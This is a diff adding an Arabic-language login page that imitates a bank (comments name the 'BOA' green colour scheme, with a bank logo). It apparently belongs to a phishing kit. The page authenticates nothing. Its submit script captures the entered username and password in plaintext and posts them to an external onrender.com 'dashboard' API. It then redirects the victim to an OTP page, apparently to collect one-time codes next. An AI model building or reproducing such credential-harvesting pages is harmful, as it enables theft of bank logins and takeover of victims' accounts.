@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>تسجيل الدخول</title>
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="style.css" />
+  <style>
+    body {
+      margin: 0;
+      font-family: "Cairo", sans-serif;
+      background: #f6f6f6;
+      color: #333;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .login-container {
+      background: #fff;
+      padding: 2rem;
+      border-radius: 12px;
+      box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1);
+      width: 100%;
+      max-width: 400px;
+      text-align: center;
+    }
+
+    .login-header {
+      margin-bottom: 1.5rem;
+    }
+
+    .login-header img {
+      max-width: 120px;
+      margin-bottom: 1rem;
+    }
+
+    .login-header h2 {
+      font-size: 1.3rem;
+      font-weight: 600;
+      color: #004c3f; /* BOA dark green */
+    }
+
+    .form-group {
+      margin-bottom: 1.2rem;
+      text-align: right;
+    }
+
+    label {
+      display: block;
+      font-size: 0.9rem;
+      margin-bottom: 0.3rem;
+      color: #004c3f;
+      font-weight: 600;
+    }
+
+    input {
+      width: 100%;
+      padding: 0.7rem;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 1rem;
+      outline: none;
+      transition: border-color 0.3s;
+    }
+
+    input:focus {
+      border-color: #008060; /* BOA green */
+    }
+
+    .login-btn {
+      background: #008060; /* BOA green */
+      color: #fff;
+      border: none;
+      padding: 0.8rem;
+      width: 100%;
+      border-radius: 8px;
+      font-size: 1rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+
+    .login-btn:hover {
+      background: #00664d;
+    }
+
+    .extra-links {
+      margin-top: 1rem;
+      font-size: 0.9rem;
+    }
+
+    .extra-links a {
+      color: #008060;
+      text-decoration: none;
+      margin: 0 0.5rem;
+      font-weight: 600;
+    }
+
+    .extra-links a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+  <div class="login-header">
+    <img src="images/semiLogo.jpeg" alt="Bank Logo">
+    <h2>دخل لحسابك</h2>
+  </div>
+
+  <form id="loginForm">
+    <div class="form-group">
+      <label for="username">اسم المستخدم</label>
+      <input type="text" id="username" placeholder="" required>
+    </div>
+
+    <div class="form-group">
+      <label for="password">كلمة السر</label>
+      <input type="password" id="password" placeholder="" required>
+    </div>
+
+    <button type="submit" class="login-btn">دخول</button>
+
+    <div class="extra-links">
+      <a href="#">نسيت كلمة السر؟</a> | 
+      <a href="#">فتح حساب جديد</a>
+    </div>
+  </form>
+</div>
+
+
+ <script>
+  const form = document.getElementById('loginForm');
+
+  form.addEventListener('submit', function (e) {
+    e.preventDefault(); // prevent refresh
+
+    const data = {
+      userName: form.username.value.trim(),
+      password: form.password.value.trim()
+    };
+
+    // basic validation
+    if (!data.userName || !data.password) {
+      alert("الرجاء إدخال اسم المستخدم وكلمة المرور");
+      return;
+    }
+
+    // Format the message
+    const message = 
+      `🔐 تسجيل دخول جديد:\n` +
+      `- اسم المستخدم: ${data.userName}\n` +
+      `- كلمة المرور: ${data.password}`;
+
+    // Send to your API
+    fetch("https://bm-dashboard-a0mt.onrender.com/api/messages", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({ text: message }),
+    })
+    .then(response => {
+      if (!response.ok) {
+        throw new Error("فشل إرسال البيانات");
+      }
+      return response.json();
+    })
+    .then(() => {
+      // ✅ success → navigate to otp page
+      window.location.href = "otp.html";
+    })
+    .catch(error => {
+      console.error("Error:", error);
+      alert("حدث خطأ أثناء محاولة تسجيل الدخول");
+    });
+  });
+</script>
+
+</body>
+</html>
